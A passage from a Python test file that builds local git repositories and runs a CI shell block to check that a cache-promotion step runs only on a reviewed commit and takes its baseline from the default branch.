    git(seed, "add", "-A")
    git(seed, "commit", "-qm", "default")
    git(seed, "remote", "add", "origin", str(remote))
    git(seed, "push", "-q", "origin", "main")
    git(seed, "checkout", "-qb", "candidate/x")
    (seed / "candidate.txt").write_text("reviewed\n")
    git(seed, "add", "-A")
    git(seed, "commit", "-qm", "candidate")
    git(seed, "push", "-q", "origin", "candidate/x")
    reviewed_commit = git(seed, "rev-parse", "HEAD")
    subprocess.run(
        [
            "git",
            "clone",
            "-q",
            "--depth",
            "1",
            "--branch",
            "candidate/x",
            f"file://{remote}",
            str(tmp_path / "cache-repo"),
        ],
        check=True,
        env=env,
    )
    if not reviewed:  # the branch advanced after review but before the clone
        (seed / "late.txt").write_text("unreviewed\n")
        git(seed, "add", "-A")
        git(seed, "commit", "-qm", "late")
    commit = reviewed_commit if reviewed else "0" * 40
    result = subprocess.run(
        ["sh", "-eu", "-c", block.replace("$[[ inputs.candidate-commit ]]", commit)],
        cwd=tmp_path,
        env={**env, "INFX_CACHE_WRITE_TOKEN": ""},
        capture_output=True,
        text=True,
    )
    assert (result.returncode == 0) is reviewed, result.stderr
    # The comparison baseline is the default branch, not the candidate branch.
    assert (tmp_path / "baseline/default.txt").exists() is reviewed
    assert not (tmp_path / "baseline/candidate.txt").exists()
    assert "--baseline-root baseline" in _text(definition["promote"])
